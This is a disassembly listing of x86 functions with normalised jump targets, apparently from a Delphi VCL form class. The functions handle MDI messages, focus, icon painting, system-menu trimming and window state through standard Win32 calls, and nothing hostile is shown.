mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_463478
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44ce54
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_44f2dc
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_44f2dc
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_4634dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_463584
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46358b
lea eax [ ebp - 0x4 ]
call sub_404008
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
mov eax edi
call sub_45f870
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_40348c
mov eax ebx
call sub_463894
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_40348c
test al al
jne r-xdata
sub_463594
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_44bdb8
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_44bdb8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_4634dc
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_4635dc
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_4634dc
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_463600
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_4184ac
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_41838c
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_4184ac
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_41838c
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_463870
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_44f2dc
mov dx 0xb000
call sub_45f630
test al al
jne r-xdata
call sub_44f2dc
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_45f630
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463877
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403af0
jmp r-xdata
call sub_403af0
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_44bdb8
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_44f2dc
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_45f630
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_449ca8
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
call sub_403af0
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_44f2dc
mov dx 0xb01a
call sub_45f630
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403af0
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_449ca8
sub_463894
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_449ca8
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_44f2dc
push eax
call SetFocus
mov eax ebx
call sub_44f2dc
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_4638e4
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_449ca8
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_463998
mov eax esi
call sub_463894
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_44f704
mov edx eax
mov eax esi
call sub_4634dc
sub_463948
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_462560
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_449ca8
mov eax ebx
call sub_462560
mov edx esi
call sub_463948
sub_463998
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_45c9bc
mov edx esi
call sub_45c9a0
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_463a40
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
sub_463a8c
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_463a40
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_463abc
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_463a40
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_463b28
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_424450
xor eax eax
push ebp
push sub_463bd6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_424934
xor eax eax
push ebp
push sub_463bb3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_40348c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463bba
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_424934
retn
sub_463be4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_462560
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_462594
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_40348c
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_44e5a4
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_4625e0
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_40348c
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_463c84
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f2dc
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_44f2dc
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_463b0c
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_44f2dc
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_44d46c
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_463d02
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_423fe8
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_463d64
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_44f2dc
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_44d730
pop edi
pop esi
retn
sub_463db0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f2dc
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_463eac
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_4628d4
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_463db0
pop ecx
sub_463ee0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_44a1c4
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44f2dc
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44f2dc
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_44f2dc
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_44919c
pop esi
pop ebx
retn
sub_463f70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_44e530
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_44f2dc
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_45c3dc
sub_463fd0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_44d5cc
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_45bdf0
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_46401c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_45c650
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_464054
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_4640ef
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4640f6
lea eax [ ebp - 0x4 ]
call sub_404008
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_45bd50
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_468e10
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_445c58
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_468e10
jmp r-xdata
sub_46411c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_40348c
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_46415c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40cbc0
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_464188
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_463948
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_445a30
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_4641e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_44e414
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4677c4
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_40348c
sub_46426c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_44f2dc
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_44f2dc
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_44f2dc
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_464304
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44f2dc
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_4638e4
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_40348c
sub_46435c
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_44f810
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_464388
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_463948
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4643a4
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_45bd80
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_45bd80
sub_4643e4
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_46441c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_40405c
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_464450
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4645a1
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4645a8
lea eax [ ebp - 0x10 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_4643a4
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_4459d4
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_416cac
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_44860c
lea eax [ ebp - 0x1c ]
call sub_406b60
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_4643a4
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_4643e4
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_468ab4
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_468b1c
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_468b1c
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_46441c
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_416cac
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_44860c
lea eax [ ebp - 0x1c ]
call sub_406b60
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_468a4c
test [ esi + 0x228 ] 0x8
je r-xdata
sub_4645b0
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_464624
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_464650
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d878
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_462660
lea edx [ ebp - 0x14 ]
call sub_465e28
push ebp
mov eax [ ebp - 0x4 ]
call sub_462660
lea edx [ ebp - 0x24 ]
call sub_465e28
